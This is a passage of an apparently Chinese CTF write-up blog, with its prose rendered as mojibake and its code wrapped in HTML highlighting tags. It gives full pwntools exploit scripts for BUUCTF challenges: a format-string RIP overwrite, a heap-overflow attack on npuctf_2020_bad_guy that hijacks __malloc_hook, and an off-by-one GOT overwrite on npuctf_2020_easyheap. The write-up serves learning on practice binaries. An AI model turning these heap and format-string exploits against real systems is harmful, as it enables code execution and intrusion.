class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"66666666\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ç¨‹åºå¯ä»¥æ— é™æ¬¡å¾ªç¯ï¼Œç›´åˆ°è¾“å…¥66666666é€€å‡ºæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨bssæ®µä¸Šçš„ç¨‹åºï¼Œæ— è®ºè¾“å…¥å¤šå°‘ä¸ª%pæˆ‘ä»¬éƒ½å¾—ä¸åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œè¿™æ ·çš„é¢˜ç›®ä¸€èˆ¬æ˜¯åœ¨æ ˆä¸Šæ‰¾ä¸€æ¡é“¾ï¼Œä»¥æ­¤ä½œä¸ºè·³æ¿ä¿®æ”¹ripçš„æœ€åå‡ ä¸ªå­—èŠ‚ä¸ºonegadget,ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹è¿™é“é¢˜ç›®é¦–å…ˆæˆ‘ä»¬è¦æ³„éœ²libcåœ°å€ï¼Œæ ˆåœ°å€ä»¥åŠç¨‹åºåŠ è½½çš„åŸºåœ°å€ï¼Œè¿™äº›åœ¨æ ˆä¸­éƒ½èƒ½æ‰¾åˆ°ç›¸åº”çš„å€¼åŠ ä»¥è¿ç®—å°±èƒ½å¾—åˆ°</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/24.jpg" alt=""></p><p>é€šè¿‡è¿™ä¸‰ä¸ªç®­å¤´æŒ‡å‘çš„å€¼æˆ‘ä¹ˆèƒ½åˆ†åˆ«ç®—å‡ºç¨‹åºåŠ è½½çš„åŸºåœ°å€ï¼ŒlibcåŸºåœ°å€å’Œæ ˆåœ°å€ï¼Œè¿™ä¸‰ä¸ªå€¼å¯¹åº”çš„åç§»åˆ†åˆ«æ˜¯6ï¼Œ7ï¼Œ9ï¼Œåç§»éƒ½æ˜¯ä¸€ä¸ªä¸ªè¯•å‡ºæ¥çš„ç¨‹åºåŠ è½½åœ°å€å’Œç¨‹åºåŠ è½½åŸºåœ°å€çš„åç§»éƒ½æ˜¯å›ºå®šçš„</p><p>æˆ‘ä»¬åªéœ€è¦è®¡ç®—å‡ºåç§»å³å¯çŸ¥é“äº†ä¸‰ä¸ªåœ°å€ä¹‹åï¼Œæ¥ç€å°±è¦ä»¥æ ˆä¸­çš„æŸä¸€æ¡é“¾ä½œä¸ºè·³æ¿æ¥ä¿®æ”¹ripäº†ï¼Œè¿™æ¡é“¾å…¶å®å°±åœ¨åç§»ä¸º9çš„ä½ç½®</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/25.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/26.jpg" alt=""></p><p>æ¥ç€ï¼Œæˆ‘ä»¬å°†åç§»ä¸º9çš„é‚£æ¡é“¾ä¸­çš„å€¼æŒ‡å‘çš„åœ°å€æ”¹ä¸ºripï¼Œä¿®æ”¹ä¹‹åå¦‚ä¸‹</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/27.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/28.jpg" alt=""></p><p>æ¥ç€ï¼Œæˆ‘ä»¬ä¿®æ”¹r13ä¸‹é¢é‚£ä¸ªåœ°å€çš„å€¼(åç§»ä¸º35)çš„åå››ä½ä¸ºonegadgetçš„åå››ä½ï¼Œè¿™æ ·çš„è¯ï¼Œripçš„åå››ä½ä¹Ÿä¼šç›¸åº”æ”¹å˜ä¿®æ”¹ä¹‹åå¦‚ä¸‹</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/29.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/30.jpg" alt=""></p><p>ä¸è¿‡onegadgetå’Œlibc_start_mainçš„åœ°å€çš„åå…­ä½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»§ç»­ä¿®æ”¹ä¸¤ä½ï¼Œäºæ˜¯æˆ‘ä»¬å†å°†__libc_start_main_å¾€åæŒªä¸¤ä½ï¼Œç„¶åå°†onegadgetç§»ä½ï¼Œé‡å¤ä¹‹å‰çš„è¿‡ç¨‹å³å¯</p><h2 id="0xc-npuctf-2020-bad-guy"><a href="#0xc-npuctf-2020-bad-guy" class="headerlink" title="0xc.npuctf_2020_bad_guy"></a>0xc.npuctf_2020_bad_guy</h2><p>ä¿æŠ¤å…¨å¼€çš„ç¨‹åºï¼Œæ¼æ´ç‚¹åœ¨editåŠŸèƒ½ä¸­ï¼Œå­˜åœ¨å­˜åœ¨å †æº¢å‡ºï¼Œæ²¡æœ‰showåŠŸèƒ½</p><p>æ•´ä½“æ€è·¯å°±æ˜¯é€šè¿‡è¦†ç›–main_arenaçš„åå››ä½åˆ°stdoutæ¥æ³„éœ²libcåœ°å€ï¼Œç„¶ååŠ«æŒmalloc_hook,expå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io=process('./badguy')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'badguy'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\xf5'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x20'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c56a3</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    __malloc_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./badguy'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#io=remote('ha1cyon-ctf.fun',30115)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å…ˆé€šè¿‡å †æº¢å‡ºï¼Œåœ¨å †ä¸Šè¸©ä¸‹main_arenaçš„åœ°å€(åšéº»çƒ¦äº†ï¼Œä¸å¿…è¿™æ ·çš„),ç„¶åæŠŠé‚£å—chunkç”³è¯·å›æ¥ï¼Œå¹¶ä¿®æ”¹fdä¸Šçš„æ•°æ®çš„æœ€åå››ä½ä¸ºstdoutçš„æœ€åå››ä½(main_arenaçš„åœ°å€è½åœ¨fdä¸Šäº†)å†ç”³è¯·å¦ä¸€å—chunkï¼Œfreeæ‰ï¼Œé€šè¿‡è¿™å—è¢«freeçš„chunkçš„ä¸Šä¸€å—chunkè¿›è¡Œæº¢å‡ºï¼Œè¦†ç›–å…¶fdæŒ‡å‘ä¹‹å‰é‚£å—fdæŒ‡å‘stdoutçš„chunkï¼Œè¿™æ ·å½“æˆ‘ä»¬addä¸¤æ¬¡ï¼Œå°±æœ‰å‡ ç‡ç”³è¯·åˆ°stdouté™„è¿‘ï¼Œæ³„éœ²å‡ºlibcåœ°å€ã€‚æœ‰äº†åœ°å€ä¹‹åï¼Œåˆæœ‰å †æº¢å‡ºï¼Œç®€ç›´æ˜¯ä¸ºæ‰€æ¬²ä¸ºï¼Œå°±ä¸ç»†ğŸ”’äº†</p><h2 id="0xc-npuctf-2020-easyheap"><a href="#0xc-npuctf-2020-easyheap" class="headerlink" title="0xc.npuctf_2020_easyheap"></a>0xc.npuctf_2020_easyheap</h2><p>å¾ˆç®€å•çš„ä¸€é“é¢˜ï¼Œ2.27çš„ç¯å¢ƒï¼Œgotè¡¨å¯å†™ï¼Œå­˜åœ¨off-by-oneæ¼æ´</p><p>å…ˆè´´ä¸Šexp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./npuctf_2020_easyheap')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29074</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'npuctf_2020_easyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> free_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿™ä¸ªç¨‹åºæ˜¯ä¸€ç§contentâ€”â€“&gt;dataçš„ç»“æ„ï¼Œcontentä¸­å­˜æ”¾ç€dataçš„æŒ‡é’ˆï¼Œshowå’Œeditæ“ä½œéƒ½æ˜¯é€šè¿‡contentä¸­çš„æŒ‡é’ˆæ¥æ“ä½œçš„ã€‚åˆ©ç”¨æ€è·¯ä¸º:é€šè¿‡off-by-oneï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬åˆ†é…çš„chunkå’Œç¨‹åºåˆ†é…çš„chunkæ„é€ å‡ºå †å—å¤ç”¨ï¼Œç„¶åå°†ç¨‹åºåˆ†é…çš„0x20å¤§å°çš„chunkä¸­å‚¨å­˜æˆ‘ä»¬ç”³è¯·çš„chunkçš„åœ°å€ä¿®æ”¹ä¸ºfree@gotçš„å€¼ï¼Œè¿™æ ·showè¿™ä¸ªchunkå°±èƒ½showå‡ºfreeçš„åœ°å€ï¼Œè¿›è€Œæ±‚å¾—systemçš„åœ°å€ï¼Œç„¶åeditè¿™ä¸ªchunkï¼Œå°†free@gotä¿®æ”¹ä¸ºsystemå³å¯</p><h2 id="0xd-zctf-2016-note3"><a href="#0xd-zctf-2016-note3" class="headerlink" title="0xd.zctf_2016_note3"></a>0xd.zctf_2016_note3</h2><p>gotè¡¨å¯å†™ï¼Œè™½ç„¶å¢åˆ æŸ¥æ”¹å››ä¸ªåŠŸèƒ½éƒ½æœ‰ï¼Œä½†showåŠŸèƒ½ğŸ”¨ç”¨æ²¡æœ‰ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦ä¿®æ”¹gotè¡¨æ¥æ³„éœ²åœ°å€ï¼Œè¿™å°±å¾—ç”¨åˆ°unlinkã€‚ç²—ç•¥ä¸€çœ‹å¹¶ä¸èƒ½å‘ç°æ˜æ˜¾çš„æ¼æ´ï¼Œä»”ç»†å®¡ä¸€å®¡æ‰å‘ç°æ¼æ´åœ¨editåŠŸèƒ½ä¸­</p><pre class=" language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_4009B9</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token 